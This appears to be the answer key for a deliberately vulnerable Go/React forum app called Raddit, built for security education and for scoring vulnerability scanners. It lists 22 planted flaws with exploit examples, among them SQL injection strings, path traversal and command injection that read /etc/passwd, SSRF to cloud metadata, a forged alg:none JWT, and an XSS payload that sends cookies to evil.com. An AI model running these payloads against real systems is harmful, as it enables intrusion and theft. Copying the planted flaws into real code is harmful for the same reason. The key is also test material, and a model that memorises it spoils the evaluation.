# Raddit - Hidden Vulnerability List (Educational Use)

> **Warning**: This project is for security education and vulnerability research only. Do not deploy it in production.

The project contains **22 vulnerabilities** across **15 distinct paths/endpoints**.

## Vulnerability Overview

| # | Type | Path / Location | Trigger |
|---|---|---|---|
| 1 | SQL injection | `POST /api/auth/login` | `username` field |
| 2 | SQL injection | `GET /api/posts/search?q=` | `q` parameter |
| 3 | SQL injection (ORDER BY) | `GET /api/posts?sort=&order=` | `sort` / `order` parameters |
| 4 | Path traversal | `GET /api/files/download?name=` | `name` parameter |
| 5 | Arbitrary file upload | `POST /api/files/upload` | No file type restriction |
| 6 | Command injection | `GET /api/tools/ping?host=` | `host` parameter |
| 7 | SSRF | `GET /api/posts/preview?url=` | `url` parameter |
| 8 | IDOR (unauthorized post deletion) | `DELETE /api/posts/:id` | No ownership check |
| 9 | Sensitive data exposure | `GET /api/users/:id` | Returns password hash |
| 10 | Mass assignment (privilege escalation) | `PUT /api/users/profile` | `role` field |
| 11 | Weak JWT secret | All authenticated endpoints | Secret is `"secret"` |
| 12 | JWT `alg:none` bypass | All authenticated endpoints | Accepts unsigned tokens |
| 13 | Information disclosure | `GET /api/admin/debug` | Exposes config / environment values |
| 14 | Hardcoded credentials | `config/config.go` | `admin:admin123` |
| 15 | Plaintext password logging | `POST /api/auth/login` | Writes plaintext password to logs |
| 16 | Missing rate limiting | `POST /api/auth/login` | Allows brute-force attempts |
| 17 | Open redirect | `POST /api/auth/login` | Unvalidated `next` parameter |
| 18 | Stored XSS | `POST /api/posts` + post detail page | Post content |
| 19 | Stored XSS | `POST /api/comments` + comment section | Comment content |
| 20 | Reflected XSS | `GET /api/posts/search` + home page | Reflected search term |
| 21 | Stored XSS | `PUT /api/users/profile` + profile page | Profile bio field |
| 22 | Missing CSRF protection | All state-changing endpoints | No CSRF token validation |

## Evaluation Grouping

### Issue Category Coverage

The 22 answer-key vulnerabilities are grouped into five mutually exclusive categories by the kind of security reasoning needed to detect them. This grouping is used to evaluate the issue scope covered by different scanning approaches.

| Category | Vulnerability IDs | Count |
|---|---|---:|
| Injection, request, and renderer sinks | #1, #2, #3, #4, #6, #7, #18, #19, #20, #21 | 10 |
| Access-control and account-state logic | #8, #10 | 2 |
| Auth, session, and token design | #11, #12, #17 | 3 |
| Missing preventive controls | #5, #16, #22 | 3 |
| Sensitive-data and configuration exposure | #9, #13, #14, #15 | 4 |

### Ideal Deliveries

The 22 answer-key vulnerabilities are also grouped into ideal deliveries. An ideal delivery is not a vulnerability count; it is a patch boundary that would be easier for a reviewer to inspect.

| Ideal delivery | Vulnerability IDs | Rationale |
|---|---|---|
| Login and authentication abuse controls | #1, #15, #16, #17 | These issues share the login handler and authentication flow. A reviewer can assess credential handling, query safety, login abuse resistance, and post-login redirect behavior together. |
| Post query construction safety | #2, #3 | Both are dynamic SQL construction issues in post listing/search paths and should be reviewed with one query-building strategy. |
| File upload and download boundary | #4, #5 | Upload acceptance and download path resolution form one file-handling trust boundary. They should be reviewed together for type/extension validation, filename normalization, storage path safety, and file-serving behavior. |
| Server-side outbound interaction safety | #6, #7 | Both connect user input to server-side command execution or network requests. The shared review question is whether external interaction is validated, constrained, or allowlisted. |
| User authorization and profile data controls | #8, #9, #10 | These are account and ownership policy failures. They require joint review of route authorization, user object serialization, and profile update permissions. |
| JWT and default credential hardening | #11, #12, #14 | These issues jointly determine whether attackers can forge privileged sessions or obtain administrative access through weak defaults. They should be reviewed as one authentication trust-boundary hardening unit. |
| Admin debug data exposure | #13 | The debug endpoint is a distinct administrative information-disclosure surface and can be reviewed independently once authentication and role enforcement are understood. |
| Frontend unsafe HTML rendering | #18, #19, #20, #21 | These share the same frontend rendering risk and should use a consistent sanitization or escaping strategy across content surfaces. |
| Cross-site request forgery protection | #22 | CSRF is a cross-cutting control for state-changing endpoints and usually requires coordinated review of middleware, client request behavior, and route coverage. |

The answer key contains 22 vulnerabilities, but the preferred review shape is **9 ideal deliveries**.

## Vulnerability Distribution By Path

| Endpoint path | Vulnerability count | Vulnerability IDs |
|---|---:|---|
| `POST /api/auth/login` | 4 | #1, #15, #16, #17 |
| `GET /api/posts` | 1 | #3 |
| `GET /api/posts/search` | 2 | #2, #20 |
| `GET /api/posts/preview` | 1 | #7 |
| `POST /api/posts` | 1 | #18 |
| `DELETE /api/posts/:id` | 1 | #8 |
| `POST /api/comments` | 1 | #19 |
| `GET /api/users/:id` | 1 | #9 |
| `PUT /api/users/profile` | 2 | #10, #21 |
| `POST /api/files/upload` | 1 | #5 |
| `GET /api/files/download` | 1 | #4 |
| `GET /api/tools/ping` | 1 | #6 |
| `GET /api/admin/debug` | 1 | #13 |
| All authenticated endpoints | 2 | #11, #12 |
| Code / configuration layer | 2 | #14, #22 |

**Total: 22 vulnerabilities across 15 paths.**

## Detailed Descriptions

### 1. SQL Injection - Login Endpoint

**Location**: `backend/handlers/auth.go` -> `Login()`

```
query := "SELECT ... WHERE username='" + req.Username + "'"
```

**Exploit**: Use `admin'--` as the username to bypass password verification, or use `' OR '1'='1` to enumerate users.

### 2. SQL Injection - Search Endpoint

**Location**: `backend/handlers/posts.go` -> `SearchPosts()`

```
"WHERE p.title LIKE '%" + keyword + "%'"
```

**Exploit**: `%' UNION SELECT id,username,password,email,role,username,0,0,datetime('now'),datetime('now') FROM users--`

### 3. SQL Injection - Sort Parameters (ORDER BY)

**Location**: `backend/handlers/posts.go` -> `ListPosts()`

```go
sortBy := c.DefaultQuery("sort", "p.created_at")  // user-controlled, directly inserted into ORDER BY
order  := c.DefaultQuery("order", "DESC")          // also user-controlled
query = fmt.Sprintf("ORDER BY %s %s", sortBy, order)
```

**Note**: Injection through `sort=` expands directly as `ORDER BY <expr>` with no prefix. Injection through `order=` expands as `ORDER BY p.created_at <suffix>`.

**Exploit A - inline `CASE` blind injection through `sort=` (true condition returns normally, false condition errors):**

```
GET /api/posts?sort=CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN p.created_at ELSE RAISE(ABORT,'sqli') END&order=DESC
```

When `COUNT(*)>0` is true, the post list returns normally. Changing the condition to `1=2` returns `{"error":"Could not fetch posts"}`.

**Exploit B - append a subquery through `order=` (verified):**

```
GET /api/posts?sort=p.created_at&order=DESC,(SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE RAISE(ABORT,'sqli') END)
```

This generates `ORDER BY p.created_at DESC,(SELECT CASE WHEN ...)`. The true condition passes silently, and the false condition triggers an `ABORT` error.

> Why `sort=(SELECT CASE WHEN ... THEN p.created_at ...)` fails: in a SQLite scalar subquery without its own `FROM`, `p.created_at` is treated as an outer correlated reference and cannot be resolved in this `ORDER BY` subquery context. Writing the `CASE` expression directly (Exploit A) or injecting the `order=` suffix (Exploit B) bypasses this limitation.

### 4. Path Traversal

**Location**: `backend/handlers/files.go` -> `DownloadFile()`

```go
filePath := config.UploadDir + "/" + filename
// No filepath.Clean call and no ".." validation
```

**Exploit**: `GET /api/files/download?name=../../etc/passwd`

### 5. Arbitrary File Upload

**Location**: `backend/handlers/files.go` -> `UploadFile()`

```go
filename := header.Filename  // preserves the original filename and does not validate the extension
```

**Exploit**: Upload a `.php`, `.sh`, or `.exe` file, then use path traversal (vulnerability #4) to reach it.

### 6. Command Injection

**Location**: `backend/utils/utils.go` -> `PingHost()`

```go
exec.Command("sh", "-c", "ping -c 3 "+host)
```

**Exploit**: `host=127.0.0.1; cat /etc/passwd` or `127.0.0.1 | id`

### 7. SSRF (Server-Side Request Forgery)

**Location**: `backend/handlers/posts.go` -> `PreviewURL()`

```go
client.Get(targetURL)  // targetURL is fully user-controlled
```

**Exploit**: `url=http://169.254.169.254/latest/meta-data/` for AWS metadata, or `url=http://192.168.1.1` for internal network probing.

### 8. IDOR - Unauthorized Post Deletion

**Location**: `backend/handlers/posts.go` -> `DeletePost()`

```go
database.DB.Exec("DELETE FROM posts WHERE id=?", postID)
// Does not check whether post.user_id == current user ID
```

**Exploit**: Any user can delete another user's post if they know the post ID.

### 9. Sensitive Data Exposure - Password Hash

**Location**: `backend/handlers/users.go` -> `GetUser()`

```go
"SELECT id, username, email, password, ..."
// The password field is included in the JSON response
```

**Exploit**: `GET /api/users/1` returns a bcrypt hash that can be attacked offline.

### 10. Mass Assignment - Privilege Escalation

**Location**: `backend/handlers/users.go` -> `UpdateProfile()`

```go
if req.Role != "" {
    database.DB.Exec("UPDATE users SET role=? WHERE id=?", req.Role, userID)
}
```

**Exploit**: A regular user sends `{"role":"admin"}` to promote themselves to administrator.

### 11. Weak JWT Secret

**Location**: `backend/config/config.go`

```go
JWTSecret = getEnv("JWT_SECRET", "secret")
```

**Exploit**: Use `jwt_tool` or hashcat to recover the secret `secret`, then forge arbitrary user tokens.

### 12. JWT Algorithm Confusion (`alg:none`)

**Location**: `backend/middleware/auth.go` -> `parseToken()`

```go
if alg != "none" {
    // verify signature
}
// When alg=none, signature verification is skipped
```

**Exploit**: Construct a header `{"alg":"none","typ":"JWT"}`, payload `{"user_id":1,"role":"admin","exp":9999999999}`, and leave the signature empty. The server accepts the token directly.

### 13. Information Disclosure - Debug Endpoint

**Location**: `backend/handlers/admin.go` -> `SystemInfo()`

Path: `GET /api/admin/debug` (requires the admin role, but can be reached by chaining vulnerability #10 or #12)

```go
"jwt_secret":     config.JWTSecret,
"admin_password": config.AdminPassword,
```

**Exploit**: Obtain the JWT secret, administrator password, database path, environment variables, and other sensitive configuration data.

### 14. Hardcoded Credentials

**Location**: `backend/config/config.go` + `backend/database/database.go`

```go
// config.go
AdminUsername = getEnv("ADMIN_USERNAME", "admin")
AdminPassword = getEnv("ADMIN_PASSWORD", "admin123")

// database.go - Initialize() calls seedAdmin(), which writes the initial admin user
DB.Exec("INSERT INTO users (..., role) VALUES (?, ?, ?, 'admin')",
    config.AdminUsername, ..., string(hashed))
```

**Exploit**: On first startup, when the database file does not exist or the admin user has not been created, the application seeds an administrator account and prints `Admin user created: admin / admin123` to the console. Logging in with `admin` / `admin123` grants full administrative access.

> **Note**: If the database file already exists and the admin account has already been seeded, `seedAdmin()` skips creation (`COUNT(*) > 0` returns early). For validation, delete the old database file (see `config.DBPath` for the default path) before restarting the service.

### 15. Plaintext Password Logging

**Location**: `backend/handlers/auth.go` -> `Login()`

```go
log.Printf("[AUDIT] Failed login attempt - username: %s password: %s ip: %s",
    req.Username, req.Password, c.ClientIP())
```

**Exploit**: Server logs, including stdout or log files, contain users' plaintext passwords. Anyone with log access can recover the password.

### 16. Missing Rate Limiting

**Location**: `POST /api/auth/login` (no rate-limiting mechanism)

**Exploit**: Attackers can make unlimited password attempts, enabling brute force and compounding the plaintext password logging issue in vulnerability #15.

### 17. Open Redirect

**Location**: `backend/handlers/auth.go` -> `Login()`, frontend `Login.jsx`

```go
// Server returns the next parameter unchanged
redirect_to: req.Next  // no validation that it is an internal path
```

**Exploit**: A phishing flow submits `POST /api/auth/login` with `{"next":"https://evil.com"}`. After login, the victim is redirected to the malicious site.

### 18. Stored XSS - Post Content

**Location**: Backend stores content without filtering (`handlers/posts.go`); frontend `PostCard.jsx` / `PostDetail.jsx`:

```jsx
dangerouslySetInnerHTML={{ __html: post.content }}
```

**Exploit**: Publish a post containing `<script>fetch('https://evil.com?c='+document.cookie)</script>`. The script executes for every visitor.

### 19. Stored XSS - Comment Content

**Location**: `Comment.jsx`

```jsx
dangerouslySetInnerHTML={{ __html: comment.content }}
```

**Exploit**: Same as above, but injected through a comment.

### 20. Reflected XSS - Search Echo

**Location**: `Home.jsx`

```jsx
<span dangerouslySetInnerHTML={{ __html: searchQuery }} />
```

**Exploit**: Send a victim a link such as `/?q=<img src=x onerror=alert(1)>`; the payload executes when the victim opens it.

### 21. Stored XSS - Profile Bio

**Location**: `Profile.jsx`

```jsx
dangerouslySetInnerHTML={{ __html: profile.bio }}
```

**Exploit**: Place an XSS payload in the profile bio. It executes for anyone who visits the user's profile.

### 22. CSRF (Cross-Site Request Forgery)

**Location**: All state-changing endpoints; `backend/handlers/auth.go` -> `Login()` sets the cookie, and `backend/main.go` configures CORS.

```go
// auth.go - Login writes an HttpOnly cookie with no explicit SameSite setting
// (browsers default to Lax)
c.SetCookie("session", token, 86400, "/", "", false, true)
// The server has no CSRF token validation and no Origin/Referer validation

// main.go - strict CORS allowlist
AllowOrigins:     []string{"http://localhost:5173", "http://localhost:3000"},
AllowCredentials: true,
```

**Dual authentication channel**: The login response writes a cookie and returns a token in the response body. The frontend stores the token in `localStorage` and sends it with `Authorization: Bearer`, while also using `credentials: 'include'` to include cookies. The middleware reads cookies first (`extractToken` checks the cookie before the bearer token).

**Exploit constraints**:

- The CORS allowlist only permits `localhost:5173/3000`, so credentialed `fetch` requests from an attacker page are blocked by preflight and the response cannot be read.
- The cookie has no explicit SameSite value, so browsers default to Lax. Cross-site POST forms therefore do not send the cookie, further limiting simple request attacks.
- The bearer token is stored in `localStorage`; cross-origin JavaScript cannot read it directly, so this is not a traditional standalone CSRF surface.

**Actually exploitable scenario: chained with XSS (vulnerabilities #18-21)**

Once an attacker obtains same-origin JavaScript execution in the victim's browser through XSS, CSRF protections are effectively bypassed. The script can read the `localStorage` token or send requests with cookies to perform arbitrary state-changing actions:

```html
<!-- Embedded in a malicious post/comment as an XSS payload -->
<script>
// Same-origin execution: CORS does not block this, and cookies/token are available
fetch('/api/users/profile', {
  method: 'PUT',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json',
             'Authorization': 'Bearer ' + localStorage.getItem('token') },
  body: JSON.stringify({ role: 'admin' })  // chained with vulnerability #10
})
</script>
```

> **Conclusion**: Standalone CSRF exploitability is limited by the CORS allowlist and implicit SameSite=Lax behavior. When chained with XSS, however, the impact is significantly amplified, making this a key link in the project's vulnerability chain.
